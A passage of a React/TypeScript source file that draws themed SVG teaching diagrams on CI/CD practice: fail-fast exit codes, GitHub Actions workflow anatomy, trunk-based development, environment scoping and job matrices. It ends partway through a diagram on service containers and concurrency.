import React from 'react';
import type { DiagramRenderer } from './diagramRegistry';

type Tone = 'sky' | 'cyan' | 'emerald' | 'amber' | 'violet' | 'rose' | 'slate';

interface ThemePalette {
  bg: string;
  bgSubtle: string;
  panel: string;
  panelAlt: string;
  border: string;
  borderStrong: string;
  grid: string;
  ink: string;
  inkMuted: string;
  inkSoft: string;
  tones: Record<Tone, { fg: string; bg: string; stroke: string; badgeFg: string }>;
}

const MONO = 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace';
const SANS = 'ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, sans-serif';

function getPalette(isLight: boolean): ThemePalette {
  if (isLight) {
    return {
      bg: '#f8fafc',
      bgSubtle: '#f1f5f9',
      panel: '#ffffff',
      panelAlt: '#f8fafc',
      border: '#cbd5e1',
      borderStrong: '#94a3b8',
      grid: '#e2e8f0',
      ink: '#0f172a',
      inkMuted: '#334155',
      inkSoft: '#64748b',
      tones: {
        sky: { fg: '#0369a1', bg: '#e0f2fe', stroke: '#0284c7', badgeFg: '#ffffff' },
        cyan: { fg: '#0e7490', bg: '#cffafe', stroke: '#0891b2', badgeFg: '#ffffff' },
        emerald: { fg: '#047857', bg: '#d1fae5', stroke: '#059669', badgeFg: '#ffffff' },
        amber: { fg: '#b45309', bg: '#fef3c7', stroke: '#d97706', badgeFg: '#ffffff' },
        violet: { fg: '#6d28d9', bg: '#ede9fe', stroke: '#7c3aed', badgeFg: '#ffffff' },
        rose: { fg: '#be123c', bg: '#ffe4e6', stroke: '#e11d48', badgeFg: '#ffffff' },
        slate: { fg: '#334155', bg: '#e2e8f0', stroke: '#64748b', badgeFg: '#ffffff' },
      },
    };
  }
  return {
    bg: '#0b1220',
    bgSubtle: '#0f172a',
    panel: '#111c2d',
    panelAlt: '#172338',
    border: '#26354d',
    borderStrong: '#3b4f6e',
    grid: '#162235',
    ink: '#f1f5f9',
    inkMuted: '#cbd5e1',
    inkSoft: '#94a3b8',
    tones: {
      sky: { fg: '#7dd3fc', bg: '#0c2d48', stroke: '#38bdf8', badgeFg: '#082f49' },
      cyan: { fg: '#67e8f9', bg: '#0b3340', stroke: '#22d3ee', badgeFg: '#083344' },
      emerald: { fg: '#6ee7b7', bg: '#093126', stroke: '#34d399', badgeFg: '#022c22' },
      amber: { fg: '#fcd34d', bg: '#382509', stroke: '#fbbf24', badgeFg: '#451a03' },
      violet: { fg: '#c4b5fd', bg: '#27194a', stroke: '#a78bfa', badgeFg: '#2e1065' },
      rose: { fg: '#fda4af', bg: '#3f1322', stroke: '#fb7185', badgeFg: '#4c0519' },
      slate: { fg: '#cbd5e1', bg: '#1e293b', stroke: '#94a3b8', badgeFg: '#0f172a' },
    },
  };
}

const CIRCLED_NUMS: Record<number, string> = { 1: '①', 2: '②', 3: '③', 4: '④' };

const SvgShell: React.FC<{
  id: string;
  isLight: boolean;
  className?: string;
  title: string;
  tag: string;
  children: (p: ThemePalette, marker: (tone: Tone) => string) => React.ReactNode;
}> = ({ id, isLight, className, title, tag, children }) => {
  const p = getPalette(isLight);
  const tones: Tone[] = ['sky', 'cyan', 'emerald', 'amber', 'violet', 'rose', 'slate'];
  const marker = (tone: Tone) => `url(#${id}-arr-${tone}-${isLight ? 'l' : 'd'})`;

  return (
    <svg
      viewBox="0 0 880 380"
      className={className ?? 'w-full h-auto'}
      role="img"
      aria-label={title}
      xmlns="http://www.w3.org/2000/svg"
    >
      <defs>
        <pattern
          id={`${id}-grid-${isLight ? 'l' : 'd'}`}
          width="22"
          height="22"
          patternUnits="userSpaceOnUse"
        >
          <path d="M 22 0 L 0 0 0 22" fill="none" stroke={p.grid} strokeWidth="0.8" />
        </pattern>
        {tones.map((t) => (
          <marker
            key={t}
            id={`${id}-arr-${t}-${isLight ? 'l' : 'd'}`}
            viewBox="0 0 10 10"
            refX="8.5"
            refY="5"
            markerWidth="6.5"
            markerHeight="6.5"
            orient="auto-start-reverse"
          >
            <path d="M 0 1.5 L 9 5 L 0 8.5 z" fill={p.tones[t].stroke} />
          </marker>
        ))}
      </defs>

      <rect x="1" y="1" width="878" height="378" rx="14" fill={p.bg} stroke={p.border} strokeWidth="1.5" />
      <rect x="2" y="42" width="876" height="336" rx="12" fill={`url(#${id}-grid-${isLight ? 'l' : 'd'})`} opacity="0.7" />
      <rect x="1" y="1" width="878" height="40" rx="14" fill={p.panelAlt} />
      <line x1="1" y1="41" x2="879" y2="41" stroke={p.border} strokeWidth="1" />

      <circle cx="20" cy="21" r="4.5" fill={p.tones.rose.stroke} opacity="0.8" />
      <circle cx="34" cy="21" r="4.5" fill={p.tones.amber.stroke} opacity="0.8" />
      <circle cx="48" cy="21" r="4.5" fill={p.tones.emerald.stroke} opacity="0.8" />

      <text x="66" y="25" fill={p.ink} fontFamily={SANS} fontSize="12.5" fontWeight="700" letterSpacing="0.2">
        {title}
      </text>
      <rect x="724" y="10" width="142" height="22" rx="6" fill={p.tones.emerald.bg} stroke={p.tones.emerald.stroke} strokeWidth="1" />
      <text x="795" y="25" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="10.5" fontWeight="700">
        {tag}
      </text>

      {children(p, marker)}
    </svg>
  );
};

const CalloutBadge: React.FC<{
  x: number | string;
  y: number | string;
  num: number;
  tone: Tone;
  p: ThemePalette;
}> = ({ x, y, num, tone, p }) => {
  const t = p.tones[tone];
  return (
    <g transform={`translate(${Number(x)}, ${Number(y)})`}>
      <rect x="-15" y="-12" width="30" height="24" rx="12" fill={t.stroke} />
      <text x="0" y="4.5" textAnchor="middle" fill={t.badgeFg} fontFamily={SANS} fontSize="13" fontWeight="800">
        {CIRCLED_NUMS[num] ?? String(num)}
      </text>
    </g>
  );
};

const BoxCard: React.FC<{
  x: number | string;
  y: number | string;
  w: number | string;
  h: number | string;
  tone: Tone;
  p: ThemePalette;
  title?: string;
  badge?: string;
  dashed?: boolean;
}> = ({ x: rawX, y: rawY, w: rawW, h: rawH, tone, p, title, badge, dashed }) => {
  const x = Number(rawX);
  const y = Number(rawY);
  const w = Number(rawW);
  const h = Number(rawH);
  const t = p.tones[tone];
  return (
    <g>
      <rect
        x={x}
        y={y}
        width={w}
        height={h}
        rx="10"
        fill={p.panel}
        stroke={t.stroke}
        strokeWidth="1.5"
        strokeDasharray={dashed ? '5 4' : undefined}
      />
      {title && (
        <>
          <rect x={x + 1} y={y + 1} width={w - 2} height="28" rx="9" fill={t.bg} />
          <line x1={x + 1} y1={y + 29} x2={x + w - 1} y2={y + 29} stroke={t.stroke} strokeOpacity="0.45" strokeWidth="1" />
          <text x={x + 12} y={y + 19} fill={t.fg} fontFamily={MONO} fontSize="11" fontWeight="700">
            {title}
          </text>
        </>
      )}
      {badge && (
        <text x={x + w - 10} y={y + 19} textAnchor="end" fill={p.inkSoft} fontFamily={MONO} fontSize="9.5" fontWeight="600">
          {badge}
        </text>
      )}
    </g>
  );
};

const Pill: React.FC<{
  x: number | string;
  y: number | string;
  w: number | string;
  h?: number | string;
  label: string;
  sub?: string;
  tone: Tone;
  p: ThemePalette;
  align?: 'left' | 'center';
}> = ({ x: rawX, y: rawY, w: rawW, h: rawH = 28, label, sub, tone, p, align = 'center' }) => {
  const x = Number(rawX);
  const y = Number(rawY);
  const w = Number(rawW);
  const h = Number(rawH);
  const t = p.tones[tone];
  return (
    <g>
      <rect x={x} y={y} width={w} height={h} rx="6" fill={t.bg} stroke={t.stroke} strokeWidth="1.1" />
      {align === 'center' ? (
        <>
          <text
            x={x + w / 2}
            y={sub ? y + h / 2 - 2 : y + h / 2 + 4}
            textAnchor="middle"
            fill={t.fg}
            fontFamily={MONO}
            fontSize="10.5"
            fontWeight="700"
          >
            {label}
          </text>
          {sub && (
            <text x={x + w / 2} y={y + h / 2 + 11} textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
              {sub}
            </text>
          )}
        </>
      ) : (
        <>
          <text x={x + 10} y={y + h / 2 + 4} fill={t.fg} fontFamily={MONO} fontSize="10.5" fontWeight="700">
            {label}
          </text>
          {sub && (
            <text x={x + w - 10} y={y + h / 2 + 3.5} textAnchor="end" fill={p.inkMuted} fontFamily={MONO} fontSize="9.5">
              {sub}
            </text>
          )}
        </>
      )}
    </g>
  );
};

// C00: POSIX Exit Code 0 vs 1..255 Fail-Fast CI Gate Pipeline (npm ci -> lint -> test -> build -> Merge Gate)
const C00Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c00" isLight={isLight} className={className} title="POSIX Exit Code 0 vs 1..255 Fail-Fast CI Gate Pipeline" tag="cicd:c00">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="56" w="832" h="140" tone="emerald" p={p} title="FAIL-FAST CI MERGE GATE (set -euo pipefail)" badge="Exit 0 Required" />
        <CalloutBadge x={44} y={56} num={1} tone="emerald" p={p} />

        <Pill x={42} y={102} w={136} h={64} label="1. npm ci" sub="Lockfile match" tone="cyan" p={p} />
        <Pill x={204} y={102} w={144} h={64} label="2. eslint + tsc" sub="Static type gate" tone="sky" p={p} />
        <Pill x={374} y={102} w={144} h={64} label="3. vitest run" sub="Unit assertions" tone="violet" p={p} />
        <Pill x={544} y={102} w={136} h={64} label="4. npm run build" sub="Emit dist/ bundle" tone="amber" p={p} />
        <Pill x={706} y={102} w={132} h={64} label="MERGE UNLOCKED" sub="All Exit Code == 0" tone="emerald" p={p} />

        <path d="M 178 134 L 202 134" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
        <path d="M 348 134 L 372 134" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
        <path d="M 518 134 L 542 134" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
        <path d="M 680 134 L 704 134" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />

        <BoxCard x="24" y="212" w="414" h="146" tone="rose" p={p} title="NON-ZERO EXIT CODES -> ABORT & BLOCK PR" badge="Fail-Fast" />
        <CalloutBadge x={44} y={212} num={2} tone="rose" p={p} />
        <Pill x={40} y={252} w={184} h={42} label="Exit 1: Test / TS Error" sub="process.exit(1)" tone="rose" p={p} />
        <Pill x={238} y={252} w={184} h={42} label="Exit 22: curl --fail" sub="HTTP 4xx / 5xx caught" tone="amber" p={p} />
        <Pill x={40} y={302} w={184} h={42} label="Exit 127: Cmd Not Found" sub="Missing PATH binary" tone="violet" p={p} />
        <Pill x={238} y={302} w={184} h={42} label="Exit 137: OOM SIGKILL" sub="128 + Signal(9) RAM cap" tone="rose" p={p} />

        <BoxCard x="458" y="212" w="398" h="146" tone="amber" p={p} title="FALSE-GREEN ANTI-PATTERNS BLOCKED" badge="Zero Silent Fails" />
        <CalloutBadge x={478} y={212} num={3} tone="amber" p={p} />
        <Pill x={474} y={252} w={366} h={42} label="FORBIDDEN: npm test || true  /  continue-on-error" sub="Swallows Exit 1 into fake Exit 0!" tone="rose" p={p} />
        <Pill x={474} y={302} w={366} h={42} label="REQUIRED: set -euo pipefail + curl --fail-with-body" sub="Preserves upstream pipe failure codes" tone="emerald" p={p} />

        <path d="M 446 166 L 446 196 L 231 196 L 231 210" fill="none" stroke={p.tones.rose.stroke} strokeWidth="1.8" strokeDasharray="4 3" markerEnd={marker('rose')} />
      </>
    )}
  </SvgShell>
);

// C01: 6 Pipeline Entities Hierarchy: Event Trigger -> Workflow -> Runner VM -> Jobs -> Steps -> Actions
const C01Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c01" isLight={isLight} className={className} title="6 CI/CD Entities Hierarchy & Ephemeral Runner Isolation Boundary" tag="cicd:c01">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="60" w="188" h="296" tone="amber" p={p} title="1. EVENT + 2. WORKFLOW" badge="Orchestrator" />
        <CalloutBadge x={44} y={60} num={1} tone="amber" p={p} />
        <Pill x={40} y={104} w={156} h={60} label="1. Event / Trigger" sub="push, pull_request, cron" tone="amber" p={p} />
        <Pill x={40} y={188} w={156} h={64} label="2. Workflow YAML" sub=".github/workflows/ci.yml" tone="sky" p={p} />
        <text x="118" y="286" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9.5">
          Spawns isolated Jobs
        </text>
        <text x="118" y="304" textAnchor="middle" fill={p.tones.sky.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          in parallel by default
        </text>

        <BoxCard x="242" y="60" w="368" h="296" tone="violet" p={p} title="3. JOB A ON 4. EPHEMERAL RUNNER VM #1" badge="ubuntu-latest" />
        <CalloutBadge x={262} y={60} num={2} tone="violet" p={p} />
        <Pill x={260} y={102} w={332} h={42} label="Fresh VM Disk (/home/runner/work) — Shared by Steps" sub="Steps run sequentially top-to-bottom on same filesystem" tone="violet" p={p} />
        <Pill x={260} y={156} w={332} h={46} label="5. Step #1 -> 6. Action: actions/checkout@v4" sub="Reusable plugin via uses: keyword" tone="cyan" p={p} />
        <Pill x={260} y={212} w={332} h={46} label="5. Step #2 -> 6. Action: setup-node@v4 (v22)" sub="Configures Node 22 + ~/.npm cache" tone="sky" p={p} />
        <Pill x={260} y={268} w={332} h={46} label="5. Step #3 -> Shell Command: run: npm test" sub="Executes bash -eo pipefail subshell" tone="emerald" p={p} />
        <text x="426" y="336" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          VM destroyed &amp; wiped immediately on Job finish!
        </text>

        <BoxCard x="634" y="60" w="222" h="296" tone="rose" p={p} title="JOB B ON RUNNER VM #2" badge="Isolated VM!" dashed />
        <CalloutBadge x={654} y={60} num={3} tone="rose" p={p} />
        <Pill x={650} y={108} w={190} h={60} label="Separate Clean VM" sub="Zero shared disk with VM #1!" tone="rose" p={p} />
        <Pill x={650} y={186} w={190} h={64} label="dist/ from Job A?" sub="MISSING unless Artifact used!" tone="amber" p={p} />
        <Pill x={650} y={268} w={190} h={60} label="Bridge via Artifacts" sub="upload/download-artifact@v4" tone="emerald" p={p} />

        <path d="M 118 164 L 118 186" fill="none" stroke={p.tones.sky.stroke} strokeWidth="1.8" markerEnd={marker('sky')} />
        <path d="M 196 220 L 240 160" fill="none" stroke={p.tones.violet.stroke} strokeWidth="2" markerEnd={marker('violet')} />
        <path d="M 196 232 L 222 232 L 222 48 L 745 48 L 745 58" fill="none" stroke={p.tones.rose.stroke} strokeWidth="1.8" strokeDasharray="4 3" markerEnd={marker('rose')} />
      </>
    )}
  </SvgShell>
);

// C02: Long-Lived Branch Merge Hell vs Trunk-Based Short-Lived PRs + Merge Queue Preventing Semantic Drift
const C02Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c02" isLight={isLight} className={className} title="Long-Lived GitFlow Merge Hell vs Trunk-Based PRs & Merge Queue" tag="cicd:c02">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="266" h="300" tone="rose" p={p} title="LONG-LIVED BRANCH HELL" badge="3-Week Drift" />
        <CalloutBadge x={44} y={58} num={1} tone="rose" p={p} />
        <Pill x={40} y={102} w={234} h={46} label="feature/checkout (21 days)" sub="4,200 LOC diverged from main" tone="rose" p={p} />
        <Pill x={40} y={160} w={234} h={46} label="feature/pricing (18 days)" sub=" green in isolation, conflicts!" tone="amber" p={p} />
        <Pill x={40} y={218} w={234} h={58} label="Friday Merge Explosion!" sub="120 Git conflicts + broken main" tone="rose" p={p} />
        <text x="157" y="306" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Delayed Integration != CI
        </text>
        <text x="157" y="324" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Plus Laptop vs Linux Case/TZ drift
        </text>

        <BoxCard x="310" y="58" w="272" h="300" tone="emerald" p={p} title="TRUNK-BASED DEVELOPMENT" badge="<24h Branches" />
        <CalloutBadge x={330} y={58} num={2} tone="emerald" p={p} />
        <Pill x={326} y={102} w={240} h={48} label="main (Always Releasable)" sub="Protected trunk — 0 broken commits" tone="emerald" p={p} />
        <Pill x={326} y={164} w={240} h={48} label="Short-Lived PR (<200 LOC)" sub="Merged daily in <4 hours" tone="sky" p={p} />
        <Pill x={326} y={226} w={240} h={56} label="Feature Flags (Dark Launch)" sub="if (flags.newCart) hides unfinished UI" tone="violet" p={p} />
        <text x="446" y="312" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          .nvmrc + TZ=UTC + Linux case check
        </text>
        <text x="446" y="328" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Eliminates Works-on-My-Mac bugs
        </text>

        <BoxCard x="602" y="58" w="254" h="300" tone="sky" p={p} title="MERGE QUEUE (ANTI-SKEW)" badge="Semantic Guard" />
        <CalloutBadge x={622} y={58} num={3} tone="sky" p={p} />
        <Pill x={618} y={102} w={222} h={50} label="PR #101: Renames fn(x)" sub="Green vs old main" tone="cyan" p={p} />
        <Pill x={618} y={164} w={222} h={50} label="PR #102: Calls old fn(x)!" sub="Also green vs old main!" tone="amber" p={p} />
        <Pill x={618} y={228} w={222} h={64} label="Merge Queue Temp Branch" sub="Tests main + #101 + #102 together!" tone="sky" p={p} />
        <text x="729" y="318" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Catches semantic skew BEFORE main
        </text>

        <path d="M 446 164 L 446 152" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
        <path d="M 729 214 L 729 226" fill="none" stroke={p.tones.sky.stroke} strokeWidth="2" markerEnd={marker('sky')} />
      </>
    )}
  </SvgShell>
);

// C03: GitHub Actions YAML Anatomy (on: pull_request/push, permissions, runs-on, actions/checkout@v4, npm ci)
const C03Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c03" isLight={isLight} className={className} title="GitHub Actions v4 Workflow YAML Anatomy (.github/workflows/ci.yml)" tag="cicd:c03">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="272" h="300" tone="amber" p={p} title="TRIGGERS & PERMISSIONS" badge="Top-Level Keys" />
        <CalloutBadge x={44} y={58} num={1} tone="amber" p={p} />
        <Pill x={40} y={100} w={240} h={52} label="on: push & pull_request" sub="branches: [main] (No duplicate runs)" tone="amber" p={p} />
        <Pill x={40} y={164} w={240} h={52} label="workflow_dispatch: inputs" sub="Manual UI trigger + choice menu" tone="violet" p={p} />
        <Pill x={40} y={228} w={240} h={56} label="permissions: contents: read" sub="Least-privilege GITHUB_TOKEN" tone="emerald" p={p} />
        <text x="160" y="314" textAnchor="middle" fill={p.tones.amber.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Path: .github/workflows/*.yml
        </text>
        <text x="160" y="330" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          2-space YAML indent (Zero Tabs!)
        </text>

        <BoxCard x="318" y="58" w="268" h="300" tone="sky" p={p} title="RUNNER + V4 ACTIONS" badge="Node 20/22 Runtime" />
        <CalloutBadge x={338} y={58} num={2} tone="sky" p={p} />
        <Pill x={334} y={100} w={236} h={48} label="runs-on: ubuntu-latest" sub="Clean Ephemeral Linux VM" tone="sky" p={p} />
        <Pill x={334} y={160} w={236} h={54} label="uses: actions/checkout@v4" sub="Shallow clone (fetch-depth: 1)" tone="cyan" p={p} />
        <Pill x={334} y={226} w={236} h={58} label="uses: actions/setup-node@v4" sub='node-version: "22" | cache: "npm"' tone="emerald" p={p} />
        <text x="452" y="314" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Never copy legacy @v2 / Node 16!
        </text>
        <text x="452" y="330" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Caches ~/.npm tarballs by lockfile SHA
        </text>

        <BoxCard x="608" y="58" w="248" h="300" tone="emerald" p={p} title="CLEAN VERIFICATION" badge="Deterministic" />
        <CalloutBadge x={628} y={58} num={3} tone="emerald" p={p} />
        <Pill x={624} y={100} w={216} h={50} label="run: npm ci" sub="Unpacks cached tarballs fast" tone="emerald" p={p} />
        <Pill x={624} y={162} w={216} h={50} label="run: npm run lint" sub="ESLint + TypeScript check" tone="sky" p={p} />
        <Pill x={624} y={224} w={216} h={50} label="run: npm test && build" sub="Vitest + production bundle" tone="violet" p={p} />
        <Pill x={624} y={286} w={216} h={48} label="Status Check Reported" sub="Required check on GitHub PR" tone="emerald" p={p} />

        <path d="M 280 126 L 332 124" fill="none" stroke={p.tones.sky.stroke} strokeWidth="2" markerEnd={marker('sky')} />
        <path d="M 570 255 L 622 125" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="2" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C04: Contexts, Masked secrets.*, Cross-Job $GITHUB_OUTPUT Passing & if: failure() / always() Execution Guards
const C04Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c04" isLight={isLight} className={className} title="Env Scope Precedence, $GITHUB_OUTPUT Relay & Conditional Guards" tag="cicd:c04">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="256" h="300" tone="sky" p={p} title="ENV SCOPE + SECRETS" badge="Narrowest Wins" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={40} y={100} w={224} h={44} label="3. Step env (Highest)" sub="Overrides Job & Workflow" tone="emerald" p={p} />
        <Pill x={40} y={154} w={224} h={44} label="2. Job env (Middle)" sub="Scoped to all steps in Job" tone="sky" p={p} />
        <Pill x={40} y={208} w={224} h={44} label="1. Workflow env (Global)" sub="Fallback default values" tone="slate" p={p} />
        <Pill x={40} y={266} w={224} h={64} label="secrets.NPM_TOKEN (***)" sub="Auto-masked in logs; safe via env:" tone="amber" p={p} />

        <BoxCard x="302" y="58" w="284" h="300" tone="violet" p={p} title="$GITHUB_OUTPUT RELAY" badge="Step & Cross-Job" />
        <CalloutBadge x={322} y={58} num={2} tone="violet" p={p} />
        <Pill x={318} y={100} w={252} h={54} label='Step id: meta -> "$GITHUB_OUTPUT"' sub='echo "tag=sha-8f3a1c" >> "$GITHUB_OUTPUT"' tone="violet" p={p} />
        <Pill x={318} y={170} w={252} h={52} label="Job outputs: { image_tag: ... }" sub="${{ steps.meta.outputs.tag }}" tone="cyan" p={p} />
        <Pill x={318} y={240} w={252} h={56} label="Downstream Job (needs: build)" sub="Reads ${{ needs.build.outputs.image_tag }}" tone="emerald" p={p} />
        <text x="444" y="324" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Legacy ::set-output is REMOVED (RCE)
        </text>

        <BoxCard x="608" y="58" w="248" h="300" tone="amber" p={p} title="EXECUTION GUARDS" badge="if: & paths:" />
        <CalloutBadge x={628} y={58} num={3} tone="amber" p={p} />
        <Pill x={624} y={100} w={216} h={48} label="if: success() (Default)" sub="Runs only when prior steps == 0" tone="emerald" p={p} />
        <Pill x={624} y={158} w={216} h={50} label="if: failure()" sub="Uploads crash traces / Slack alert" tone="rose" p={p} />
        <Pill x={624} y={218} w={216} h={50} label="if: always() & !cancelled()" sub="Guaranteed teardown / cleanup" tone="amber" p={p} />
        <Pill x={624} y={278} w={216} h={54} label="paths-ignore: ['**.md']" sub="Skips CI on docs-only commits!" tone="sky" p={p} />

        <path d="M 444 154 L 444 168" fill="none" stroke={p.tones.cyan.stroke} strokeWidth="1.8" markerEnd={marker('cyan')} />
        <path d="M 444 222 L 444 238" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

// C05: Pipeline DAG (needs: Fan-Out / Fan-In) & Build strategy.matrix (OS x Node Version + fail-fast: false)
const C05Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c05" isLight={isLight} className={className} title="Pipeline DAG (Fan-Out / Fan-In needs:) & Cartesian Strategy Matrix" tag="cicd:c05">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="488" h="300" tone="sky" p={p} title="DIRECTED ACYCLIC GRAPH (DAG: needs:)" badge="Promise.all() CI" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />

        <Pill x={40} y={162} w={92} h={56} label="Trigger" sub="t = 0s" tone="amber" p={p} />

        <Pill x={156} y={100} w={132} h={48} label="lint (2m)" sub="Root Job #1" tone="cyan" p={p} />
        <Pill x={156} y={166} w={132} h={48} label="typecheck (2m)" sub="Root Job #2" tone="sky" p={p} />
        <Pill x={156} y={232} w={132} h={48} label="unit-test (5m)" sub="Root Job #3" tone="violet" p={p} />

        <Pill x={318} y={136} w={174} h={56} label="build (3m) Fan-In" sub="needs: [lint, type, test]" tone="emerald" p={p} />
        <CalloutBadge x={486} y={136} num={2} tone="emerald" p={p} />
        <Pill x={318} y={214} w={174} h={56} label="deploy-staging" sub="needs: build + ref==main" tone="amber" p={p} />

        <text x="268" y="318" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="10" fontWeight="700">
          Wall-Clock: max(2, 2, 5) + 3 = 8m (vs 12m Serial!)
        </text>
        <text x="268" y="336" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          AND Gate: Any failed upstream skips build immediately
        </text>

        <path d="M 132 178 L 154 124" fill="none" stroke={p.tones.cyan.stroke} strokeWidth="1.8" markerEnd={marker('cyan')} />
        <path d="M 132 190 L 154 190" fill="none" stroke={p.tones.sky.stroke} strokeWidth="1.8" markerEnd={marker('sky')} />
        <path d="M 132 202 L 154 256" fill="none" stroke={p.tones.violet.stroke} strokeWidth="1.8" markerEnd={marker('violet')} />
        <path d="M 288 124 L 316 154" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
        <path d="M 288 190 L 316 164" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
        <path d="M 288 256 L 316 176" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
        <path d="M 405 192 L 405 212" fill="none" stroke={p.tones.amber.stroke} strokeWidth="1.8" markerEnd={marker('amber')} />

        <BoxCard x="532" y="58" w="324" h="300" tone="violet" p={p} title="STRATEGY.MATRIX (3 OS x 2 NODE)" badge="6 Parallel Jobs" />
        <CalloutBadge x={552} y={58} num={3} tone="violet" p={p} />
        <Pill x={550} y={102} w={138} h={42} label="ubuntu + Node 20" sub="PASS (0)" tone="emerald" p={p} />
        <Pill x={700} y={102} w={138} h={42} label="ubuntu + Node 22" sub="PASS (0)" tone="emerald" p={p} />
        <Pill x={550} y={156} w={138} h={42} label="macos + Node 20" sub="PASS (0)" tone="emerald" p={p} />
        <Pill x={700} y={156} w={138} h={42} label="macos + Node 22" sub="PASS (0)" tone="emerald" p={p} />
        <Pill x={550} y={210} w={138} h={42} label="windows + Node 20" sub="FAIL (Path \\)" tone="rose" p={p} />
        <Pill x={700} y={210} w={138} h={42} label="windows + Node 22" sub="STILL RUNS!" tone="sky" p={p} />
        <Pill x={550} y={268} w={288} h={64} label="fail-fast: false (Recommended)" sub="Default true cancels other 5 jobs on 1st failure, hiding full OS compatibility report!" tone="amber" p={p} />
      </>
    )}
  </SvgShell>
);

// C06: Ephemeral Service Containers (postgres + redis healthchecks), timeout-minutes Guard & concurrency Cancel-In-Progress
const C06Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c06" isLight={isLight} className={className} title="Ephemeral Service Containers, Timeout Ceiling & Concurrency Control" tag="cicd:c06">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="352" h="300" tone="sky" p={p} title="JOB RUNNER + SERVICE CONTAINERS" badge="Real DB Tests" />
        <CalloutBadge x={44} y={58} num={1} tone="sky" p={p} />
        <Pill x={42} y={100} w={316} h={52} label="Integration Test Step (Prisma / Vitest)" sub="Connects localhost:5432 & localhost:6379" tone="sky" p={p} />
        <Pill x={42} y={172} w={152} h={76} label="postgres:16-alpine" sub="--health-cmd pg_isready" tone="emerald" p={p} />
        <Pill x={206} y={172} w={152} h={76} label="redis:7-alpine" sub="--health-cmd redis-cli" tone="violet" p={p} />
        <Pill x={42} y={266} w={316} h={64} label="Healthcheck Gate Prevents ECONNREFUSED" sub="Steps wait until DBs report healthy; wiped after Job!" tone="cyan" p={p} />

        <path d="M 118 152 L 118 170" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
        <path d="M 282 152 L 282 170" fill="none" stroke={p.tones.violet.stroke} strokeWidth="1.8" markerEnd={marker('violet')} />

        <BoxCard x="398" y="58" w="214" h="300" tone="rose" p={p} title="TIMEOUT GUARD" badge="Billing Shield" />
        <CalloutBadge x={418} y={58} num={2} tone="rose" p={p} />
        <Pill x={414} y={102} w={182} h={64} label="GitHub Default: 360m!" sub="Hung DB pool burns 6 hours!" tone="rose" p={p} />
        <Pill x={414} y={188} w={182} h={68} label="timeout-minutes: 10" sub="Hard ceiling kills hung job fast" tone="emerald" p={p} />
        <text x="505" y="294" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Saves thousands of CI mins
        </text>
        <text x="505" y="314" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Mandatory on every CI Job
        </text>

        <BoxCard x="632" y="58" w="224" h="300" tone="amber" p={p} title="CONCURRENCY MODES" badge="PR vs Prod" />
        <CalloutBadge x={652} y={58} num={3} tone="amber" p={p} />
